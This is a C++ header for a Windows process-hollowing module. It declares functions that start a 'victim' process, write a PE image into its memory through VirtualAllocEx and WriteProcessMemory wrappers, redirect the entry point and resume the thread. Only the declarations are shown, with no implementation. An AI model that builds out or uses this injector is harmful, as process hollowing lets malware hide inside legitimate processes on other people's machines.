#pragma once
#ifndef _WINDOWS_
#include <Windows.h>
#endif

#include <stdio.h>
#include <psapi.h>

#include <vector>

#ifndef CONFIG_OK
#include "../config.h"
#endif

#ifndef DISABLE_LIBRARY_INFO
#ifdef CONFIG_COMPILE64
#pragma message (OUTPUT_PRIMARY "hollow: Loading standard memory module (64)")
#else 
#pragma message (OUTPUT_PRIMARY "hollow: Loading standard memory module (32)")
#endif
#endif

//#include "error.h"
#include "api.h"
#include "common/mem.h"
#include "common/fs.h"

#pragma once

namespace hollow
{

	// Error handling
#define CHECK_STATUS(x) if (x != error::ER_HOLLOW_OK) { return x; }

	// API
#define HOLLOW_ZEROMEM			mem::zeromem
#define HOLLOW_FREE				mem::free
#define HOLLOW_LOADRAWFILE		fs::read_raw_into_buffer
#define HOLLOW_CREATEPROCESSA	cCreateProcessA
#define HOLLOW_MALLOC			mem::malloc
#define HOLLOW_MEMCPY			mem::copy
#define HOLLOW_VIRTALLOCEX		cVirtualAllocEx
#define HOLLOW_WRITEPROCMEM		cWriteProcessMemory
#define HOLLOW_RESTHREAD		cResumeThread
#define HOLLOW_QUERYPROC		cZwQueryInformationProcess
#define HOLLOW_READPROCMEM		cReadProcessMemory


#define HOLLOW_OPCODE			0xe8

#ifndef ERROR_CODE
#define ERROR_CODE UINT
#endif

	// Hollow entry point
	ERROR_CODE entry(__in LPCVOID raw_image, __in LPCSTR target);

	// Checks if there is a problem in opening the victim file
	ERROR_CODE pretest(LPCSTR target);

	// Checks PE header integrity
	ERROR_CODE check_pe(LPCVOID raw_image);

	// Sets up the virtual image from the raw image
	ERROR_CODE setup_virtual_image(	__in	LPCVOID		raw_image,
									__out	LPVOID		*virtual_image,
									__out	PUINT		virtual_image_size);

	// Inject the code
	ERROR_CODE inject(PPROCESS_INFORMATION process, LPCVOID virtual_image, UINT virtual_image_size);

	// Get base address
	DWORD find_base(LPCVOID virtual_image);

	// Remote host OEP
	DWORD get_remote_host_oep(PPROCESS_INFORMATION process);

	// Get local OEP
	LPTHREAD_START_ROUTINE find_oep(LPCVOID virtual_image);

	class hl_instance;

	class hl_instance {
	private:
		StrString			TargetFile;
		Buffer2				RawPE;

	public:
		hl_instance::hl_instance(__in const str_string& target_file, 
			__in const mem::buffer2& raw_pe);

		bool test_target(void) const
		{
			ERROR_CODE pretest_status = pretest(**TargetFile);
			if (pretest_status != error::ER_HOLLOW_OK) {
				return false;
			}

			return true;
		}

		bool hollow_target(void);

	};
};